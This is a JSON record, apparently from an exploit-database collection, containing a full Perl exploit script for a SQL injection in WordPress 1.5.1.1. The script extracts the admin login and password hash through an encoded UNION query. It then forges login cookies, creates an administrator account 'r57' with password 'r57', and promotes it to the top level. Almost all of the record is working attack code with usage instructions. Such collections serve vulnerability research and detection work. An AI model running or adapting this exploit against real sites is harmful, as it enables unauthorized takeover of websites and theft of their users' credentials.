{
  "id": "1059",
  "title": "WordPress Core 1.5.1.1 - &#039;add new admin&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\n## WordPress <= 1.5.1.1 sql injection \"add new admin\" exploit\r\n## by RST/GHC , http://rst.void.ru , http://ghc.ru\r\n## coded by 1dt.w0lf\r\n\r\nuse LWP::UserAgent;\r\nuse Getopt::Std;\r\nuse HTTP::Cookies;\r\nuse Digest::MD5 qw(md5_hex);\r\ngetopts('h:p:');\r\n\r\n$path = $opt_h;\r\n$pref = $opt_p || 'wp_';\r\n\r\nif(!$path) { usage(); }\r\n\r\n$xpl = LWP::UserAgent->new() or die;\r\n&header();\r\nprint \" +---[x] STEP 1 - TRY GET ADMIN INFO\\n\";\r\n$reg  = $path;\r\n$reg .= '?%63%61%74=%36%36%36%20%75%6E%69%6F%6E%20%73%65%6C%65%63%74%20%36%36%36%2C%63%6F%6E'.\r\n        '%63%61%74%28%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%6C%6F%67%69'.\r\n        '%6E%2C%63%68%61%72%28%35%38%2C%35%38%2C%35%38%29%2C%75%73%65%72%5F%70%61%73%73%2C%63'.\r\n        '%68%61%72%28%35%38%2C%35%38%2C%35%38%29%29%2C%6E%75%6C%6C%2C%6E%75%6C%6C%2C%6E%75%6C'.\r\n        '%6C%20%66%72%6F%6D%20'.$pref.'%75%73%65%72%73%20%57%48%45%52%45%20%49%44=1'; ### 1 - admin ID\r\n$res = $xpl->get($reg);\r\ndie \"ERROR : \", $res->status_line unless $res->is_success;\r\nif($res->content =~ m/(?::::)(.*)(?::::)([a-f0-9]{32})(?::::)(<\\/title>)/) \r\n  { \r\n  $login = $1; $hash = $2; \r\n  print \"\\n>> LOGIN : $login\\n>>  HASH : $hash\\n\\n\";\r\n  }\r\nelse { print \"ERROR : Forum not vulnerable or bad prefix.\"; exit(); }\r\n\r\n$cookie_jar = HTTP::Cookies->new();\r\n($cpath = $path) =~ s!/$!!;\r\n$hash  = md5_hex($hash);\r\n($host   = $cpath) =~ s!http://([^/]*).*!$1!;\r\n$cpath = md5_hex($cpath);\r\n\r\n$xpl->cookie_jar( $cookie_jar );\r\n\r\n$cookie_jar->set_cookie( \"0\",\"wordpresspass_$cpath\",\"$hash\",\"/\",$host,,,,,);\r\n$cookie_jar->set_cookie( \"1\",\"wordpressuser_$cpath\",\"$login\",\"/\",$host,,,,,);\r\nprint \" +---[x] STEP 2 - CREATE NEW USER\\n\";\r\n$reg  = $path;\r\n$reg .= 'wp-admin/users.php';\r\n$res = $xpl->post(\"$reg\",\r\n{\r\n \"action\"     => \"adduser\",\r\n \"user_login\" => \"r57\",\r\n \"firstname\"  => \"RST\",\r\n \"lastname\"   => \"GHC\",\r\n \"email\"      => \"billy\\@microsoft.com\",\r\n \"uri\"        => \"http://rst.void.ru\",\r\n \"pass1\"      => \"r57\",\r\n \"pass2\"      => \"r57\",\r\n \"adduser\"    => \"Submit\",\r\n},\r\nReferer => $reg\r\n);\r\nprint \" +---[x] STEP 3 - GET ID OF NEW USER\\n\";\r\n$reg  = $path;\r\n$reg .= 'wp-admin/users.php';\r\n$res = $xpl->get(\"$reg\",Referer => $reg);\r\n@res = split(/\\n/,$res->content);\r\n$id = 0;\r\nfor(@res)\r\n {\r\n  if(/(?:\\<td align=\\'center\\'\\>)([0-9]*)(?:\\<\\/td\\>)/) { $id = $1; }\r\n  if(/\\<td\\>\\<strong\\>r57\\<\\/strong\\>\\<\\/td\\>/) { last; }\r\n }\r\ndie \"ERROR : \", $res->status_line unless $res->is_success;\r\nif($id != 0) { print \"\\n>> ID : $id\\n\\n\"; }\r\nelse { print \"[-] ERROR : CAN'T GET NEW USER ID\\n\"; exit(); }\r\nprint \" +---[x] STEP 4 - LEVEL UP FOR NEW USER\\n\\n\";\r\n$reg  = $path;\r\n$reg .= 'wp-admin/users.php?action=promote&id='.$id.'&prom=up';\r\nfor($i=0;$i<10;$i++)\r\n{\r\nprint \">> LEVEL UP # $i\\n\";\r\n$res = $xpl->get(\"$reg\",Referer => $reg);\r\ndie \"ERROR : \", $res->status_line unless $res->is_success;\r\n}\r\nprint \"\\nTHATS ALL. NOW YOU CAN LOGIN WITH USERNAME 'r57' AND PASSWORD 'r57'\\n\";\r\n\r\nsub usage()\r\n{\r\n &header();\r\n print \"USAGE : r57wp.pl [OPTIONS]\\n\";\r\n print \"\\noptions:\\n\\n\";\r\n print \"-h [path]\\n\";\r\n print \"\tPath to wordpress installed\\n\";\r\n print \"-p [prefix] (optional)\\n\";\r\n print \"\tDatabase tables prefix (default 'wp_')\\n\\n\";\r\n print \"e.g.: r57wp.pl -h http://blah.com/wordpress/\\n\";\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n print \"(c)oded by 1dt.w0lf\\n\";\r\n print \"RST/GHC\\n\";\r\n print \"http://ghc.ru\\n\";\r\n print \"http://rst.void.ru\\n\";\r\n exit();\r\n}\r\nsub header()\r\n{\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n print \"                 WordPress 1.5.1.1 exploit                 \\n\";\r\n print \"~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\\n\";\r\n}\r\n\r\n# milw0rm.com [2005-06-21]",
  "url": "https://www.exploit-db.com/exploits/1059"
}